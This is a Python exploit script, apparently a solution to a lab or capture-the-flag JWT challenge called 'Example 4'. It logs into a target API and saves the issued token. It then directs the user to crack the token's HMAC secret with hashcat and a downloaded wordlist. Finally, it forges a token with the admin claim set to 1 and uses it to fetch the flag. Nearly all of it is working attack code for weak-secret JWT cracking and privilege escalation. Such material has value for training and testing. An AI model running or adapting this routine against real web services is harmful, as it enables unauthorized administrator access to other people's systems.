## command for hashcat:
## hashcat -m 16500 -a 0 jwt.txt jwt.secrets.list
## wordlist: wget https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list

import requests
import json
import base64
import hmac
import hashlib
import sys
import os

# --- Configuration for Example 4: Weak Secret Cracking ---
TARGET_IP = "10.64.168.127"
AUTH_URL = f"http://{TARGET_IP}/api/v1.0/example4"
FLAG_URL = f"http://{TARGET_IP}/api/v1.0/example4?username=admin"
USERNAME = "user"
PASSWORD = "password4" 
JWT_FILE = "jwt.txt" # File to save the JWT for Hashcat
# -------------------------------------------------------------------

def base64url_encode(data):
    """Encodes bytes to Base64URL string (removes padding, replaces chars)"""
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')

def sign_token(header_b64, payload_b64, secret_key):
    """
    Manually calculates the HS256 signature using the recovered secret key.
    """
    # Data to sign is the encoded header and payload joined by a dot
    data_to_sign = f"{header_b64}.{payload_b64}".encode('utf-8')
    
    # Calculate HMAC-SHA256 signature
    signature_bytes = hmac.new(
        secret_key.encode('utf-8'),
        data_to_sign,
        hashlib.sha256
    ).digest()
    
    # Base64URL encode the signature
    return base64url_encode(signature_bytes)


def exploit_example4():
    print(f"[*] Exploit 4: Starting Weak Secret Cracking Attack (IP: {TARGET_IP})")
    
    # --- PHASE 1: Retrieve and Save JWT for Cracking ---
    print(f"\n[PHASE 1/2] Retrieving JWT for Hashcat...")
    print(f"[1/4] Authenticating to {AUTH_URL}...")
    auth_data = json.dumps({"username": USERNAME, "password": PASSWORD})

    try:
        response = requests.post(
            AUTH_URL,
            data=auth_data,
            headers={'Content-Type': 'application/json'}
        )
        response.raise_for_status()
        data = response.json()
        
        if 'token' not in data:
            print("[-] Error: 'token' not found in response.")
            print(f"Response: {data}")
            return

        jwt_token = data['token']
        print(f"[+] Base Token Retrieved: {jwt_token}")
        
        # Save the token to a file as required by the challenge
        with open(JWT_FILE, 'w') as f:
            f.write(jwt_token)
        print(f"[+] Token saved to '{JWT_FILE}'. Ready for Hashcat.")

    except requests.exceptions.RequestException as e:
        print(f"[-] HTTP Request Failed during authentication: {e}")
        return
    except json.JSONDecodeError:
        print(f"[-] Error: Failed to decode JSON response. Received: {response.text}")
        return
    except IOError as e:
        print(f"[-] Error writing JWT to file: {e}")
        return

    # --- Manual Step ---
    print("\n" + "=" * 50)
    print("!!! MANUAL STEP REQUIRED !!!")
    print("1. Download the wordlist: wget https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list")
    print(f"2. Run Hashcat (Mode 16500) to crack the secret:")
    print(f"   hashcat -m 16500 -a 0 {JWT_FILE} jwt.secrets.list")
    print("3. Copy the recovered secret key (e.g., 'secret123').")
    print("=" * 50)

    # --- PHASE 2: Forge Token with Recovered Secret ---
    print(f"\n[PHASE 2/2] Forging Admin Token with Recovered Secret...")
    
    cracked_secret = input("Please enter the secret key recovered by Hashcat: ").strip()

    if not cracked_secret:
        print("[-] Secret key cannot be empty. Exiting.")
        return

    # 1. Split the original token parts
    try:
        parts = jwt_token.split('.')
        header_b64 = parts[0]
        # Payload: Decode, modify admin=1, re-encode
        decoded_payload_str = json.loads(base64.urlsafe_b64decode(parts[1] + '====').decode('utf-8'))
        
        # Modification: Privilege escalation by setting admin claim
        decoded_payload_str['admin'] = 1
        new_payload_b64 = base64url_encode(json.dumps(decoded_payload_str).encode('utf-8'))
        
        # 2. Sign the modified payload with the recovered secret
        new_signature_b64 = sign_token(header_b64, new_payload_b64, cracked_secret)

        # 3. Forge the final token
        forged_token = f"{header_b64}.{new_payload_b64}.{new_signature_b64}"
        print(f"[+] Forged Admin Token: {forged_token}")

    except Exception as e:
        print(f"[-] Error during token forging: {e}")
        return

    # 4. Use the forged token to get the flag
    print(f"\n[4/4] Sending final request with forged token to {FLAG_URL}")
    flag_response = requests.get(
        FLAG_URL,
        headers={'Authorization': f'Bearer {forged_token}'}
    )

    print("-" * 50)
    print(f"Example 4 Result (Weak Secret):")
    print(f"Request URL: {FLAG_URL}")
    print(f"Response Status: {flag_response.status_code}")
    print("Response Body (Flag likely here):")
    print(flag_response.text.strip())
    print("-" * 50)


if __name__ == "__main__":
    
    print("--- JWT Weak Secret Cracking Exploiter (Example 4) ---")
    
    # Allow user to specify IP, default to 10.64.168.127
    ip_input = input(f"Enter the target IP address (default: {TARGET_IP}): ").strip()
    if ip_input:
        TARGET_IP = ip_input
        
    exploit_example4()